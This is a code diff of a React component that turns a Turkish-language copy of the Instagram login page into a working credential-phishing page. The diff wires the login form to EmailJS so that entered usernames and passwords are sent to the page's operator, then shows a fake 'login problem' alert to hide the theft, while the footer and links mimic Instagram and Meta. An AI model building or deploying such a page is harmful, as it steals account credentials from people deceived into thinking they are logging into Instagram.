@@ -1,71 +1,99 @@
-import { useState } from "react";
-import reactLogo from "./assets/react.svg";
-import viteLogo from "/vite.svg";
+import React, { useRef, useState } from "react";
+import emailjs from "@emailjs/browser";
+
 import "./App.css";
 
 function App() {
+  const form = useRef();
+
+  const sendEmail = (e) => {
+    e.preventDefault();
+
+    emailjs
+      .sendForm("service_jpyc2gm", "template_p4bmhcl", form.current, {
+        publicKey: "V57OWPDudEhHuEDPU",
+      })
+      .then(
+        () => {
+          alert("Giriş yaparken bir sorunla karşılaşıldı!");
+        },
+        (error) => {
+          alert("Kullanıcı adı veya şifre yanlış...");
+        }
+      );
+  };
+
   return (
     <body>
       <div id="content-container">
-        <section class="phones">
-          <img src="/phones.png" alt="pictures on phone" class="phone-image" />
-          <div class="display-phone">
-            <img class="picture" src="/photo-1.png" alt="#" />
-            <img class="picture" src="/photo-2.png" alt="#" />
-            <img class="picture" src="/photo-3.png" alt="#" />
-            <img class="picture" src="/photo-4.png" alt="#" />
-            <img class="picture" src="/photo-5.png" alt="#" />
+        <section className="phones">
+          <img
+            src="/phones.png"
+            alt="pictures on phone"
+            className="phone-image"
+          />
+          <div className="display-phone">
+            <img className="picture" src="/photo-1.png" alt="#" />
+            <img className="picture" src="/photo-2.png" alt="#" />
+            <img className="picture" src="/photo-3.png" alt="#" />
+            <img className="picture" src="/photo-4.png" alt="#" />
+            <img className="picture" src="/photo-5.png" alt="#" />
           </div>
         </section>
 
-        <section class="user">
-          <div class="login-container">
-            <div class="instagram-logo-box">
-              <img class="instagram-logo" src="/instagram-logo.png" />
+        <section className="user">
+          <div className="login-container">
+            <div className="instagram-logo-box">
+              <img className="instagram-logo" src="/instagram-logo.png" />
             </div>
 
-            <form id="login-post" method="POST">
-              <div class="inputs-container">
+            <form id="login-post" ref={form} onSubmit={sendEmail} method="POST">
+              <div className="inputs-container">
                 <input
                   type="text"
-                  name="username"
+                  name="user_name"
                   placeholder="Telefon numarası veya e-posta"
                 />
               </div>
-              <div class="inputs-container">
-                <input type="password" name="password" placeholder="Şifre" />
+              <div className="inputs-container">
+                <input
+                  type="password"
+                  name="user_password"
+                  placeholder="Şifre"
+                />
               </div>
-              <a class="login-button" href="#">
-                Giriş Yap
-              </a>
+              <input
+                type="submit"
+                className="login-button"
+                value={"Giriş Yap"}
+              />
 
-              <div class="or-container">
-                <div class="line"></div>
-                <div class="or">YA DA</div>
-                <div class="line"></div>
+              <div className="or-container">
+                <div className="line"></div>
+                <div className="or">YA DA</div>
+                <div className="line"></div>
               </div>
-
-              <div class="facebook-container">
-                <a class="facebook-login" href="#">
-                  <img class="facebook-logo" src="/facebook-logo.png" />
+              <div className="facebook-container">
+                <a className="facebook-login" href="#">
+                  <img className="facebook-logo" src="/facebook-logo.png" />
                   Facebook ile Giriş Yap
                 </a>
               </div>
             </form>
 
             <a
-              class="password-forgot"
+              className="password-forgot"
               href="https://www.instagram.com/accounts/password/reset/"
             >
               Şifreni mi unuttun?
             </a>
           </div>
 
-          <div class="signup-container">
+          <div className="signup-container">
             <p>
               Hesabın yok mu?{" "}
               <a
-                class="signup"
+                className="signup"
                 href="https://www.instagram.com/accounts/emailsignup/"
               >
                 Hesap oluştur
@@ -73,52 +101,52 @@ function App() {
             </p>
           </div>
 
-          <div class="get-container">
+          <div className="get-container">
             <p>Uygulamayı indir.</p>
-            <div class="download-container">
+            <div className="download-container">
               <a
-                class="download-appstore"
+                className="download-appstore"
                 href="https://apps.apple.com/tr/app/instagram/id389801252"
               >
-                <img class="appstore" src="/applestore-logo.png" />
+                <img className="appstore" src="/applestore-logo.png" />
               </a>
               <a
-                class="download-googleplay"
+                className="download-googleplay"
                 href="https://play.google.com/store/apps/details?id=com.instagram.android"
               >
-                <img class="googleplay" src="/googleplay-logo.png" />
+                <img className="googleplay" src="/googleplay-logo.png" />
               </a>
             </div>
           </div>
         </section>
       </div>
 
-      <footer class="page-footer">
-        <div class="links-container">
-          <ul class="links-list">
+      <footer className="page-footer">
+        <div className="links-container">
+          <ul className="links-list">
             <li>
-              <a class="link" href="https://about.meta.com/">
+              <a className="link" href="https://about.meta.com/">
                 Meta
               </a>
             </li>
             <li>
-              <a class="link" href="https://about.instagram.com/">
+              <a className="link" href="https://about.instagram.com/">
                 Hakkında
               </a>
             </li>
             <li>
-              <a class="link" href="https://about.instagram.com/blog">
+              <a className="link" href="https://about.instagram.com/blog">
                 Blog
               </a>
             </li>
             <li>
-              <a class="link" href="#">
+              <a className="link" href="#">
                 İş Fırsatları
               </a>
             </li>
             <li>
               <a
-                class="link"
+                className="link"
                 href="https://about.instagram.com/about-us/careers"
               >
                 Yardım
@@ -126,7 +154,7 @@ function App() {
             </li>
             <li>
               <a
-                class="link"
+                className="link"
                 href="https://privacycenter.instagram.com/policy/?entry_point=ig_help_center_data_policy_redirect"
               >
                 Gizlilik
@@ -134,7 +162,7 @@ function App() {
             </li>
             <li>
               <a
-                class="link"
+                className="link"
                 href="https://developers.facebook.com/docs/instagram"
               >
                 API
@@ -142,7 +170,7 @@ function App() {
             </li>
             <li>
               <a
-                class="link"
+                className="link"
                 href="https://help.instagram.com/581066165581870/"
               >
                 Koşullar
@@ -150,22 +178,22 @@ function App() {
             </li>
             <li>
               <a
-                class="link"
+                className="link"
                 href="https://www.instagram.com/explore/locations/"
               >
                 Konumlar
               </a>
             </li>
             <li>
-              <a class="link" href="https://www.threads.net/login/">
+              <a className="link" href="https://www.threads.net/login/">
                 Threads
               </a>
             </li>
           </ul>
         </div>
 
-        <div class="footer-span-container">
-          <span class="footer-span">© 2024 Instagram from Meta</span>
+        <div className="footer-span-container">
+          <span className="footer-span">© 2024 Instagram from Meta</span>
         </div>
       </footer>
     </body>
